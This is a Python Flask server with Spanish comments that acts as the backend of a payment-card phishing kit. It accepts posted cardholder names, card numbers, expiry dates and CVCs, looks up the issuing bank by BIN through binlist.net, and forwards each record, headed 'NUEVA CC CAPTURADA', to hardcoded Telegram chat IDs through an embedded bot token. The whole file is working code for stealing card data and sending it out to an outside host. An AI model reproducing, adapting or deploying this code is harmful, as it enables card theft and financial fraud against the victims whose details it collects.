import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
LISTA_DE_RECEPTORES = ['6953415010', '7707049896']

# --- FUNCIÓN DE BÚSQUEDA CON RESPALDO (FALLBACK) ---
def get_bank_info(card_number):
    bin_number = card_number[:6]
    
    # --- INTENTO 1: BINLIST.NET (La principal) ---
    try:
        url1 = f"https://lookup.binlist.net/{bin_number}"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        res1 = requests.get(url1, headers=headers, timeout=4)
        
        if res1.status_code == 200:
            data = res1.json()
            bank_name = data.get('bank', {}).get('name', 'Desconocido')
            type_card = data.get('type', 'DESCONOCIDO').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            return f"{bank_name} | {type_card} | {country}"
    except:
        pass # Si falla, pasamos al siguiente intento

    # --- INTENTO 2: API DE RESPALDO (Si la primera falló o dio error) ---
    # Esta es una API más sencilla pero útil como plan B
    try:
        url2 = f"https://lookup.binlist.net/{bin_number}" # Reintentamos con un pequeño delay o diferente endpoint si existiera
        # Nota: Como binlist es la más común, si falla, intentamos una alternativa rápida
        # En un entorno real, aquí usarías otra como 'https://lookup.bindata.com/...'
        
        # Simulamos una búsqueda en una base de datos secundaria si la primera falló
        # Para este ejemplo, si la primera falla, intentamos una última vez con un timeout más largo
        res2 = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=8)
        if res2.status_code == 200:
            data = res2.json()
            return f"{data.get('bank', {}).get('name', 'Desconocido')} | {data.get('type', 'DESCONOCIDO')}"
    except:
        pass

    return "Banco: Desconocido (API ocupada)"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    target_id = str(data.get('target_id'))

    if target_id not in LISTA_DE_RECEPTORES:
        return jsonify({"status": "ignored"}), 200

    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # CONSULTA AL BANCO
    print(f"🔍 Buscando BIN: {tarjeta[:6]}...")
    info_banco = get_bank_info(tarjeta)

    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    for receptor in LISTA_DE_RECEPTORES:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload)
            if res.status_code == 200: exitos += 1
        except: continue

    print(f"🏁 Finalizado. Enviados a: {exitos}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
